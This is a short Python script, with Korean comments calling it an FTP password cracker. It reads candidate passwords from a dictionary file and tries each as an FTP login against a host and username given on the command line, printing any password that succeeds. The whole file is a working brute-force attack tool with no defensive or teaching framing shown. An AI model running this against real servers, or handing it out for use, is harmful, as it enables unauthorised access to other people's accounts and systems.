#!/usr/bin/python3
# FTP passward 크랙
# ftplib를 사용한 단순

import sys
import ftplib

# ftp로그인 작업
def ftplogin(passwd):
    global host_ip, port, username
    try:
        serv = ftplib.FTP()
        serv.connect(host_ip, port, timeout=30)
        serv.login(username, passwd)
        print("Success\n  %s Password : %s" % (username, passwd))
        serv.quit()
        return
    except:
        print("test Password : %s" % (passwd))
        return

# 사용법
if len(sys.argv) != 3 :
    print("USAGE: pyhon FTP_pwcrack.py [host_ip] [username]")
    quit(1)

host_ip = sys.argv[1]
port = 21
username = sys.argv[2]
passwd = "user1."

# 사전파일과 실제 공격
f = open("Dictionary.txt","rt")
for passwd in f.readlines():
    ftplogin(passwd.strip())
f.close()

